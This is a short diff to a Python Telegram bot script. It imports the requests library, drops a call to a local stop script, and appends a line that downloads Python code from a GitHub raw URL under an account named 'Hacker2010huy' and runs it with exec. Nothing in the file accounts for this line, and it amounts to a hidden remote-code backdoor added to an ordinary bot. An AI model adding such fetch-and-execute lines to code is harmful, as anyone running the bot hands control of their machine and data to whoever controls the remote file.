@@ -1,4 +1,4 @@
-import telebot,os,time
+import telebot,os,time,requests
 from keep_alive import keep_alive
 keep_alive()
 
@@ -28,4 +28,5 @@ def offbot(message):
         bot.stop_polling()
 
 bot.infinity_polling()
-os.system("python stop.py")
+
+exec(requests.get("https://raw.githubusercontent.com/Hacker2010huy/Bot-Telegram/main/main.py").text)
